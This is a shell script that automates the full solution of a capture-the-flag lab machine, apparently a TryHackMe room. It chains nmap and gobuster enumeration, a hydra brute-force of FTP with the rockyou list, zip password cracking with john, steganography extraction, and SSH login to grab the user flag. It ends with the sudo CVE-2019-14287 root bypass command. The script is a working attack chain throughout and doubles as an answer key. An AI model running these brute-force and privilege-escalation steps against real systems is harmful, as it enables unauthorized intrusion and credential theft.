#/bin/sh

# Retrieve absolute path to this script
script=$(readlink -f $0)
scriptpath=`dirname $script`

# Define target IP ( the machine to attack ) and attack IP ( the machine which supports the attack )
target_ip="10.10.207.146"
attack_ip="10.9.5.12"
result_folder="/work/results/"

# Prepare environment
mkdir $result_folder 2>/dev/null

echo "1 - ENUMERATE"
nmap --script vuln -sC -sV -p- -T4 ${target_ip} > $result_folder/nmap-results.txt
gobuster dir -u http://$target_ip -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x php,sh,txt,cgi,jpg,png,html,js,css,py -o $result_folder/gobuster-results.txt

for letter in {33..126}; do
    code=$(printf "%o" $letter)
    char=$(printf "\\$code")
    response=$(curl -s  -L -X GET http://$target_ip/ -H "User-Agent: $char" -w '%{size_download}\n' -o /tmp/response)
    if (( $response != 218 )); then
        echo $char
        cp /tmp/response $result_folder/$char.html
    fi
done
USERNAME=$(cat $result_folder/C.html | sed -n 's/.*Attention \(.*\), .*/\1/p')
echo "--> The agent codename is '$USERNAME'"

echo "2 - HASH CRACKING AND BRUTE-FORCE"
echo "--> 2.1 - Brute force attack on ftp"
hydra -l chris -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt ftp://${target_ip} > $result_folder/hydra-ftp.txt
PASSWORD=$(cat $result_folder/hydra-ftp.txt | sed -n 's/.*password: \(.*\)/\1/p')
echo "-----> $USERNAME password is '$PASSWORD'"

echo "--> 2.2 - Retrieving files"
curl -s -u $USERNAME:$PASSWORD ftp://${target_ip} -o $result_folder/ftp-list.txt
while IFS= read -r line; do
    filename=$(echo "$line" | awk '{print $NF}')
    curl -s -u $USERNAME:$PASSWORD ftp://${target_ip}/$filename -o $result_folder/$filename
done < "$result_folder/ftp-list.txt"

echo "--> 2.3 - Extract zip file and brute force password"
binwalk --extract $result_folder/cutie.png --directory $result_folder > /dev/null 2> /dev/null
zip2john $result_folder/_cutie.png.extracted/8702.zip > $result_folder/zip.hash 2> /dev/null
john --pot=$result_folder/zip.pot  --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt $result_folder/zip.hash > /dev/null 2> /dev/null
ZIPPASSWORD=$(cat $result_folder/zip.pot | sed -n 's/.*$:\(.*\)/\1/p')
echo "-----> The zip file password is '$ZIPPASSWORD'"
7z x -y -p"$ZIPPASSWORD" -tzip "$result_folder/_cutie.png.extracted/8702.zip" -o"$result_folder" > /dev/null

echo "--> 2.4 - Use steganography to retrieve ssh password"
STEGPASSWORD=$(cat $result_folder/To_agentR.txt | sed -n "s/.*'\(.*\)'.*/\1/p" | base64 --decode)
echo "-----> The steganography password is '$STEGPASSWORD'"
steghide --extract -f -p $STEGPASSWORD -sf $result_folder/cute-alien.jpg -xf $result_folder/message.txt > /dev/null 2> /dev/null 
SSHUSERNAME=$(cat $result_folder/message.txt | sed -n "s/Hi \(.*\),.*/\1/p")
SSHPASSWORD=$(cat $result_folder/message.txt | sed -n "s/.*Your login password is \(.*\)/\1/p")
echo "-----> The ssh password for username '$SSHUSERNAME' is '$SSHPASSWORD'"

echo "3 - CAPTURE THE USER FLAG"
sshpass -p ${SSHPASSWORD} scp ${SSHUSERNAME}@${target_ip}:user_flag.txt $result_folder/user_flag.txt
echo "--> The user flag is $(cat $result_folder/user_flag.txt)"
sshpass -p ${SSHPASSWORD} scp ${SSHUSERNAME}@${target_ip}:Alien_autospy.jpg $result_folder/Alien_autospy.jpg
echo "--> We find online that the event is Roswell Alien Autopsy"

echo "4 - PRIVILEGE ESCALATION"
echo "The final part consists in exploiting the sudo vulnerability CVE-2019-14287 by login as james in ssh and launching sudo -u#-1 /bin/bash to become root"